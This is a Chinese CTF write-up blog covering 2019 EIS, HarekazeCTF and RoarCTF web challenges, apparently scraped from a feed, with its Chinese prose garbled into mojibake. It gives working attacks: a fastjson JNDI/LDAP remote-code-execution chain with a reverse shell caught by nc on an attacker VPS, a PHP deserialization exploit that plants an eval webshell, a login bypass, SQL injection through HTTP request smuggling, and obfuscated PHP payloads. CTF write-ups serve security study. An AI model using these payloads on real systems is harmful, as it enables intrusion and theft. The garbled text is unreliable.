<h2><span id="ezcms">ezcms</span></h2><h2><span id="ezjava">ezjava</span></h2><p><code>\WEB-INF\lib</code>ç›®å½•ä¸‹æœ‰<code>fastjson-1.2.47.jar</code>æ–‡ä»¶ï¼Œè°·æ­Œä¸‹ï¼Œä¼°è®¡æ˜¯å‰ä¸ªæŠŠæœˆå‡ºçš„<code>fastjson-1.2.47-RCE</code>åˆšåˆšå¥½å¤ç°ä¸€æ³¢ï¼ˆè„šæœ¬å°å­ä¸Šçº¿â€¦..</p>
<p>####Ubuntuå®‰è£…jdk8</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install openjdk-8-jdk</span><br></pre></td></tr></table></figure>

<h4><span id="æµ‹è¯•å¤–è¿">æµ‹è¯•å¤–è¿</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param=&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://ip:port/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è‡ªå·±vpsä¸Š<code>nc -lvvp port</code>ç›‘å¬æœåŠ¡å™¨æœ‰æµé‡å°±å¯ä»¥ç»§ç»­æ‰“</p>
<h4><span id="ä¿®æ”¹exploitå¹¶ç¼–è¯‘æˆclassæ–‡ä»¶">ä¿®æ”¹Exploitå¹¶ç¼–è¯‘æˆclassæ–‡ä»¶</span></h4><p>å°†<code>Exploit.java</code>æ–‡ä»¶å†…çš„<code>ip</code>å’Œ<code>port</code>æ”¹ä¸ºè‡ªå·±<code>vps</code>çš„,ç¼–è¯‘<code>Exploit.java</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>

<h4><span id="å‡†å¤‡ldapæœåŠ¡webæœåŠ¡å’Œncæ­£åœ¨å‡†å¤‡æ¥æ”¶åå¼¹å›æ¥çš„shell">å‡†å¤‡LDAPæœåŠ¡ï¼ŒWebæœåŠ¡å’Œncæ­£åœ¨å‡†å¤‡æ¥æ”¶åå¼¹å›æ¥çš„SHELL</span></h4><p>åœ¨å½“å‰ç›®å½•ä¸‹è¿è¡ŒLDAPæœåŠ¡,ä¿®æ”¹IPä¸ºå½“å‰è¿™å°æœåŠ¡å™¨çš„IP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IP:port_1/#Exploit</span><br></pre></td></tr></table></figure>

<p>åœ¨å½“å‰ç›®å½•ä¸‹è¿è¡ŒWebæœåŠ¡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server port_1</span><br></pre></td></tr></table></figure>

<p>ncæ­£åœ¨å‡†å¤‡æ¥æ”¶åå¼¹å›æ¥çš„SHELL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure>

<h4><span id="æœ€ç»ˆæ‰§è¡Œ">æœ€ç»ˆæ‰§è¡Œ</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">param=&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://ip:1389/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="ezupload">ezupload</span></h2><p>F12æœ‰<code>&lt;!---/.login.php.swp--&gt;</code>æ‹¿åˆ°<code>login.php</code>çš„æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($username))&#123;</span><br><span class="line">    $sql = <span class="string">"select password from user where name=?"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($stmt = $mysqli-&gt;prepare($sql)) &#123;</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($dpasswd);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> ($dpasswd === $password)&#123;</span><br><span class="line">	    $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">            header(<span class="string">"Location: /upload.php"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"login failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $stmt-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: /index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;close();</span><br></pre></td></tr></table></figure>

<p>ç”¨äº†é¢„ç¼–è¯‘ï¼Œæ³¨å…¥å¯èƒ½ä¸å¤ªå¥½ä½¿äº†<br>ä½†æ˜¯åœ¨<code>login.php</code>é‡Œ<code>$dpasswd</code>æ²¡æœ‰å®šä¹‰æ‰€ä»¥å¦‚æœæŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ·åï¼Œå®ƒçš„å€¼ä¸ºNULL<br>æŠ“åŒ…å°†<code>&amp;password=</code>åˆ é™¤ï¼Œåç«¯å°±ä¼šæŠŠ<code>pasword</code>è¿™ä¸ªå˜é‡å€¼ä¸ºNULLï¼Œç»•è¿‡ç™»å½•<br><img src="/2019/11/25/2019EIS-Web/2.png" alt><br>ç„¶åå°±æ˜¯ä¸ªä¸Šä¼ <br><img src="/2019/11/25/2019EIS-Web/3.png" alt><br>å¸¸è§„æ“ä½œ<br><img src="/2019/11/25/2019EIS-Web/5.png" alt><br>ç„¶åçœ‹åˆ°å›æ˜¾<code>/tmp</code>æˆ‘ä»¥ä¸ºä¸Šä¼ åˆ°<code>/tmp</code>ç›®å½•ä¸‹äº†ï¼Œç„¶åå°±å¡ä½äº†ï¼Œç»“æœèµ›åæ‰çŸ¥é“åœ¨<code>./uploads</code>ä¸‹â€¦..æ˜æ˜æ˜¯çš„æ²¡æœ‰å¼±å¯†ç å’Œä¸éœ€è¦ä½¿ç”¨æ‰«æå™¨çš„â€¦..<br>èšå‰‘ç›´æ¥è¿æ‹¿flag</p>
<h2><span id="ezpop">ezpop</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct() -&gt; save() -&gt; getForStorage() -&gt; cleanContents() -&gt; set() -&gt; getExpireTime() -&gt; getCacheKey() -&gt; serialize() -&gt; file_put_contents()</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è¦æ§åˆ¶<code>B::set()</code>å†…çš„<code>$filename, $data</code><br>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//class A</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    protected $store = (new B());</span></span><br><span class="line"><span class="comment">//    protected $key = "exp.php";</span></span><br><span class="line"><span class="comment">//    protected $expire;</span></span><br><span class="line"><span class="comment">//    public $autosave;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key = <span class="string">"1.php"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span> -&gt; complete = [<span class="string">"1"</span>];</span><br><span class="line">        <span class="keyword">$this</span> -&gt; cache = [<span class="string">"PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pOz8+"</span>];</span><br><span class="line">        <span class="keyword">$this</span> -&gt; expire =<span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] = <span class="string">"php://filter/write=string.strip_tags|convert.base64-decode/resource=./uploads/"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>]=<span class="string">'trim'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($class));</span><br></pre></td></tr></table></figure>

<h2><span id="ezwaf">ezwaf</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $newarr = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $key=&gt;$val)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($val))</span><br><span class="line">        &#123;</span><br><span class="line">            $newarr[$key] = mysqli_real_escape_string($mysqli, $val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $newarr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET= escape($_GET);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">    mysqli_query($mysqli, <span class="string">"select age from user where name='$name'"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'age'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $age = $_GET[<span class="string">'age'</span>];</span><br><span class="line">    mysqli_query($mysqli, <span class="string">"select name from user where age=$age"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€æœ‰<code>GET</code>è¯·æ±‚çš„å‚æ•°éƒ½ç»è¿‡äº†<code>mysqli_real_escape_string()</code>å¤„ç†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysqli_real_escape_string()</span><br><span class="line">éœ€è¦è¿›è¡Œè½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">ä¼šè¢«è¿›è¡Œè½¬ä¹‰çš„å­—ç¬¦åŒ…æ‹¬ï¼š NUL ï¼ˆASCII 0ï¼‰ï¼Œ\nï¼Œ\rï¼Œ\ï¼Œ&apos;ï¼Œ&quot; å’Œ Control-Z.</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å®ƒ<code>age</code>å‚æ•°ä¸éœ€è¦â€™ â€œå°±å¯ä»¥æ³¨å…¥<br>å°è¯•æ³¨å…¥<code>http://111.186.57.43:10601/?src=&amp;age=0and sleep(3)</code>å‘ç°å‡ºç°<code>403</code><br>å’Œ<code>RoarCTF</code>çš„<code>easy_calc</code>ä¸€æ ·ï¼Œä¸­é—´åå‘ä»£ç†æœåŠ¡å™¨æœ‰WAFï¼Œå¯ä»¥ç”¨<code>CL-CL</code>HTTPè¯·æ±‚èµ°ç§æ¼æ´<br><img src="/2019/11/25/2019EIS-Web/6.png" alt></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="2019å®‰å…¨è¿ç»´æŒ‘æˆ˜èµ›web_wp">2019å®‰å…¨è¿ç»´æŒ‘æˆ˜èµ›Web_Wp</span></h1><p>[TOC]</p>
<h2><span id="ezbypass">ezbypass</span></h2><p><img src="/2019/11]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[HarekazeCTF2019]]></title>
    <link href="/2019/11/22/HarekazeCTF2019/"/>
    <id>/2019/11/22/HarekazeCTF2019/</id>
    <published>2019-11-22T08:45:22.000Z</published>
    <updated>2019-11-22T09:55:53.169Z</updated>
    <content type="html"><![CDATA[<h1><span id="å¤ç°ä¸€æ³¢harekazectf_web">å¤ç°ä¸€æ³¢HarekazeCTF_Web</span></h1><h2><span id="encode_and_encode">encode_and_encode</span></h2><p>ç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>

<p><code>POST page</code>ä¼ æ–‡ä»¶åè¿›å»ï¼Œæ–‡ä»¶å†…å®¹ç»™äº†<code>content</code>,æœ€åè¾“å‡º<code>content</code>ï¼Œä½†æ˜¯æœ‰æ­£åˆ™è¿‡æ»¤<br>phpçš„json_decode()è‡ªåŠ¨ä¼šæŠŠ<code>Unicode</code>è½¬æ¢ï¼Œä¹Ÿå°±æ˜¯<code>\u0066\u006c\u0061\u0067 ==&gt; flag</code><br><img src="/2019/11/22/HarekazeCTF2019/1.png" alt><br>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/flag</span><br><span class="line">&#123;&quot;page&quot;:&quot;\u002f\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼ äº†<code>/flag</code>å›æ˜¾<code>{&quot;content&quot;:&quot;&lt;p&gt;not found&lt;\/p&gt;\n&quot;}</code>ã€‚ã€‚ã€‚ä¹Ÿæ²¡æœ‰flag.phpï¼Œç»“æœæ˜¯<code>flag</code>æ­£åˆ™è¢«wafäº†<br>ç”¨phpä¼ªåè®®è¯»flagçš„base64</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=/flag</span><br><span class="line">&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>##</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="å¤ç°ä¸€æ³¢harekazectf_web">å¤ç°ä¸€æ³¢HarekazeCTF_Web</span></h1><h2><span id="encode_and_encode">encode_and_encode</span></h2><p>ç»™äº†æºç </p>
]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[RoarCTF_Web]]></title>
    <link href="/2019/11/15/RoarCTF-Web/"/>
    <id>/2019/11/15/RoarCTF-Web/</id>
    <published>2019-11-15T14:24:43.000Z</published>
    <updated>2019-11-17T12:52:54.811Z</updated>
    <content type="html"><![CDATA[<h1><span id="roarctf_web">RoarCTF_Web</span></h1><p>[TOC]</p>
<h2><span id="easy_calc">easy_calc</span></h2><p>å›½èµ›calcçš„+++å¼ºç‰ˆï¼Œè¿˜åŠ äº†waf<br>æ”¶é›†äº†å„ä½å¸ˆå‚…çš„è§£æ³•ï¼Œæœ‰ä¸‰ç§</p>
<h3><span id="httpåè®®httpè¯·æ±‚èµ°ç§">httpåè®®,httpè¯·æ±‚èµ°ç§</span></h3><p>ï¼ˆå¯èƒ½ä¼šæ–°å¼€ä¸€ç¯‡blogå»ç ”ç©¶<br><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a><br><a href="https://xz.aliyun.com/t/6631" target="_blank" rel="noopener">https://xz.aliyun.com/t/6631</a><br><img src="/2019/11/15/RoarCTF-Web/1.png" alt><br>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?num=var_dump(scandir(chr(47)))</span><br><span class="line">/calc.php?num=var_dump(show_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br><span class="line">/calc.php?num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br><span class="line">/calc.php?num=var_dump(highlight_file(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br><span class="line">/calc.php?num=var_dump(readfile(chr(47).base_convert(25254448,10,36)))</span><br></pre></td></tr></table></figure>

<h3><span id="phpå­—ç¬¦ä¸²è§£æç‰¹æ€§bypass">phpå­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass</span></h3><p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
<h3><span id="ç¡¬åˆšæŒ‰ä½ä¸ampå’ŒæŒ‰ä½æˆ–">(ç¡¬åˆš)æŒ‰ä½ä¸&amp;å’ŒæŒ‰ä½æˆ–|</span></h3><p>å®ƒæŠŠ<code>^</code>(æŒ‰ä½å¼‚æˆ–)è¿‡æ»¤äº†,é‚£æˆ‘è¿˜æœ‰<code>&amp;</code>(æŒ‰ä½ä¸)ã€<code>|</code>(æŒ‰ä½æˆ–)ã€<code>ï½</code>(æ±‚åè¿ç®—)ã€<code>&lt;&lt;</code>(å·¦ç§»è¿ç®—)ã€<code>&gt;&gt;</code>(å³ç§»è¿ç®—)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$char = <span class="string">'1234567890-INFAH@+*%$()"!%meogiakcfhvwbnq_'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($char); $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($char); $j++)&#123;</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'&amp;'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] &amp; $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'|'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] | $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:<br>phpinfo()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((((2).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))&amp;((((0/0).(0))&#123;1&#125;)|(((1).(0))&#123;0&#125;))).((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;1&#125;)).(((((2).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))&amp;((((0/0).(0))&#123;1&#125;)|(((1).(0))&#123;0&#125;))).(((999**999).(1))&#123;0&#125;).(((999**999).(1))&#123;1&#125;).(((999**999).(1))&#123;2&#125;).((((999**999).(1))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))()</span><br></pre></td></tr></table></figure>

<p>(scandir)(../../../)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((((2).(0))&#123;0&#125;)&#123;0&#125;)|(((0/0).(0))&#123;1&#125;)).(((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))&amp;((((1).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))).((((2).(0))&#123;0&#125;)|((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;2&#125;))).(((999**999).(1))&#123;0&#125;).(((0/0).(0))&#123;1&#125;).((((999**999).(1))&#123;1&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))).(((999**999).(1))&#123;0&#125;).((((2).(0))&#123;0&#125;)|((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;1&#125;))).(((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))&amp;((((1).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))))(((((((2).(0))&#123;0&#125;)&#123;0&#125;)|(((0/0).(0))&#123;1&#125;)).((((0/0).(0))&#123;1&#125;)|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))).((((0/0).(0))&#123;1&#125;)|(((-2).(1))&#123;0&#125;)&amp;(((1).(0))&#123;0&#125;)).(((999**999).(1))&#123;1&#125;).(((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;2&#125;))|((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))).(((999**999).(1))&#123;0&#125;).((((2).(0))&#123;0&#125;)|((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;2&#125;))))((((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#12